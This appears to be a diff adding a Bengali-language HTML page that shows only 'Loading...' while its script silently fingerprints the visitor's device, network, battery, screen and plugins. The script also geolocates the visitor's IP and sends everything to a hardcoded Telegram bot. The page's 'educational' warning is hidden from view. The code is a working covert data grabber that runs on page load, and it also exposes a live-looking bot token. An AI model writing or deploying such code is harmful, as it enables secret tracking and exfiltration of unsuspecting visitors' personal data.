@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>System!</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
+      color: #f0f0f0;
+      padding: 20px;
+    }
+    h1, h2 {
+      color: #ffc107;
+    }
+    ul {
+      list-style: none;
+      padding-left: 0;
+    }
+    li {
+      margin-bottom: 5px;
+    }
+    #status {
+      background: #222;
+      padding: 10px;
+      margin-top: 10px;
+      border-left: 5px solid #ffc107;
+    }
+    .section {
+      margin-bottom: 30px;
+    }
+    .warning {
+      background: #ff5722;
+      padding: 10px;
+      color: #fff;
+      border-radius: 4px;
+      margin-bottom: 20px;
+    }
+    @media (max-width: 600px) {
+      body {
+        font-size: 16px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <h1>Loading...</h1>
+  <div class="warning" style="display: none;">
+    সতর্কতা: এই পেজটি শুধুমাত্র <strong>শিক্ষামূলক</strong> উদ্দেশ্যে তৈরি। ক্লায়েন্ট-সাইডে টেলিগ্রাম বট টোকেন রাখা নিরাপত্তার জন্য অত্যন্ত ঝুঁকিপূর্ণ।
+  </div>
+  <p id="status" style="display: none;">তথ্য সংগ্রহ করা হচ্ছে...</p>
+
+  <div id="info" style="display: none;"></div>
+
+  <script>
+    const BOT_TOKEN = "7501055809:AAHybTQCakGqgj45Z88HzY3GdT7H-MhzC58";
+    const CHAT_ID = "7945358964";
+
+    const sanitizeForMarkdownV2 = (text) => {
+      return text.replace(/[\\_*\[\]()~`>#+\-=|{}.!]/g, (match) => '\\' + match);
+    }
+
+    const status = (msg) => {
+      document.getElementById("status").innerText = msg;
+    }
+
+    const appendSection = (title, items) => {
+      const container = document.getElementById("info");
+      const section = document.createElement("div");
+      section.className = "section";
+      section.innerHTML = `<h2>${title}</h2><ul>${items.map(item => `<li>${item}</li>`).join('')}</ul>`;
+      container.appendChild(section);
+    }
+
+    const getInfo = async () => {
+      try {
+        status("তথ্য সংগ্রহ করা হচ্ছে...");
+        const ua = navigator.userAgent;
+        const lang = navigator.language;
+        const online = navigator.onLine ? "অনলাইনে" : "অফলাইনে";
+        const dnt = navigator.doNotTrack === "1" ? "অন" : "বন্ধ";
+        const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light";
+
+        let os = "অজানা";
+        if (/Windows NT 10/.test(ua)) os = "Windows 10";
+        else if (/Android/.test(ua)) os = ua.match(/Android\s[\d\.]+/)[0];
+        else if (/iPhone OS/.test(ua)) os = ua.match(/OS [\d_]+/)[0].replace("_", ".");
+
+        const browserMatch = ua.match(/(Chrome|Firefox|Safari|Edg|Opera)[/\s]([\d]+)/);
+        const browser = browserMatch ? `${browserMatch[1]} ${browserMatch[2]}` : "অজানা";
+
+        const deviceType = /Mobi/.test(ua) ? "Mobile" : (/Tablet|iPad/.test(ua) ? "Tablet" : "Desktop");
+        const deviceModel = ua.match(/; ([^;]*) Build/)?.[1] || "নির্ধারিত নয়";
+
+        appendSection("সাধারণ তথ্য", [
+          `User Agent: ${ua}`,
+          `OS: ${os}`,
+          `Browser: ${browser}`,
+          `Device Type: ${deviceType}`,
+          `Device Model: ${deviceModel}`
+        ]);
+
+        appendSection("পেইজ ও নেভিগেশন", [
+          `URL: ${location.href}`,
+          `Title: ${document.title}`,
+          `Referrer: ${document.referrer}`,
+          `ভাষা: ${lang}`,
+          `স্ট্যাটাস: ${online}`,
+          `Cookies Enabled: ${navigator.cookieEnabled}`,
+          `Do Not Track: ${dnt}`,
+          `কালার স্কিম: ${darkMode}`
+        ]);
+
+        appendSection("স্ক্রিন তথ্য", [
+          `Resolution: ${screen.width}x${screen.height}`,
+          `Available: ${screen.availWidth}x${screen.availHeight}`,
+          `Color Depth: ${screen.colorDepth}`,
+          `Pixel Depth: ${screen.pixelDepth}`,
+          `Device Pixel Ratio: ${window.devicePixelRatio}`,
+          `Orientation: ${screen.orientation.type}`
+        ]);
+
+        const now = new Date();
+        appendSection("সময় তথ্য", [
+          `লোকাল সময়: ${now.toLocaleString("bn-BD")}`,
+          `UTC: ${now.toUTCString()}`,
+          `TimeZone Offset: ${now.getTimezoneOffset()} মিনিট`
+        ]);
+
+        appendSection("হার্ডওয়্যার তথ্য", [
+          `CPU কোর: ${navigator.hardwareConcurrency || "অজানা"}`,
+          `RAM: ${navigator.deviceMemory || "অজানা"} GB`,
+          `Touch Support: ${("ontouchstart" in window) ? "হ্যাঁ" : "না"}`
+        ]);
+
+        if ('connection' in navigator) {
+          const c = navigator.connection;
+          appendSection("নেটওয়ার্ক", [
+            `প্রকার: ${c.type}`,
+            `Effective: ${c.effectiveType}`,
+            `Downlink: ${c.downlink} Mbps`,
+            `RTT: ${c.rtt} ms`,
+            `Data Saver: ${c.saveData ? "চালু" : "বন্ধ"}`
+          ]);
+        }
+
+        if ('getBattery' in navigator) {
+          status("ব্যাটারি তথ্য আনা হচ্ছে...");
+          try {
+            const battery = await navigator.getBattery();
+            appendSection("ব্যাটারি", [
+              `Level: ${battery.level * 100}%`,
+              `Charging: ${battery.charging ? "হ্যাঁ" : "না"}`,
+              `Time to Charge: ${battery.chargingTime} s`,
+              `Time to Discharge: ${battery.dischargingTime} s`
+            ]);
+          } catch {}
+        }
+
+        const plugins = Array.from(navigator.plugins).map(p => p.name);
+        appendSection("ব্রাউজার প্লাগইন", plugins);
+
+        status("IP তথ্য আনা হচ্ছে...");
+        try {
+          const res = await fetch("http://ip-api.com/json/?fields=66846719");
+          const ipInfo = await res.json();
+          if (ipInfo.status === "success") {
+            appendSection("IP ভিত্তিক তথ্য", [
+              `IP: ${ipInfo.query}`,
+              `ISP: ${ipInfo.isp}`,
+              `Organization: ${ipInfo.org}`,
+              `AS: ${ipInfo.as}`,
+              `Country: ${ipInfo.country} (${ipInfo.countryCode})`,
+              `Region: ${ipInfo.regionName}`,
+              `City: ${ipInfo.city}`,
+              `ZIP: ${ipInfo.zip}`,
+              `Latitude: ${ipInfo.lat}`,
+              `Longitude: ${ipInfo.lon}`,
+              `TimeZone: ${ipInfo.timezone}`,
+              `Mobile: ${ipInfo.mobile}`,
+              `Proxy/VPN: ${ipInfo.proxy}`,
+              `Hosting: ${ipInfo.hosting}`
+            ]);
+          } else {
+            appendSection("IP তথ্য", ["ত্রুটি: API ব্যর্থ হয়েছে"]);
+          }
+        } catch (e) {
+          appendSection("IP তথ্য", ["ত্রুটি: API অনুপলব্ধ"]);
+        }
+
+        status("তথ্য টেলিগ্রামে পাঠানো হচ্ছে...");
+        if (BOT_TOKEN === "YOUR_BOT_TOKEN" || CHAT_ID === "YOUR_TELEGRAM_CHAT_ID") {
+          status("ত্রুটি: টোকেন বা চ্যাট আইডি সেট করা হয়নি");
+          return;
+        }
+
+        const content = document.getElementById("info").innerText;
+        const message = sanitizeForMarkdownV2(`*তথ্য সংগ্রহ প্রতিবেদন*\n\n${content}`);
+
+        try {
+          const sendRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: message,
+              parse_mode: "MarkdownV2"
+            })
+          });
+          const json = await sendRes.json();
+          if (json.ok) {
+            status("সফলভাবে পাঠানো হয়েছে!");
+          } else {
+            status("পাঠাতে ত্রুটি: " + json.description);
+            console.error("Problematic message:", message);
+          }
+        } catch (e) {
+          status("নেটওয়ার্ক ত্রুটি: টেলিগ্রামে পাঠাতে ব্যর্থ");
+        }
+      } catch (err) {
+        status("ত্রুটি: " + err.message);
+      }
+    }
+
+    window.onload = getInfo;
+  </script>
+</body>
+</html>
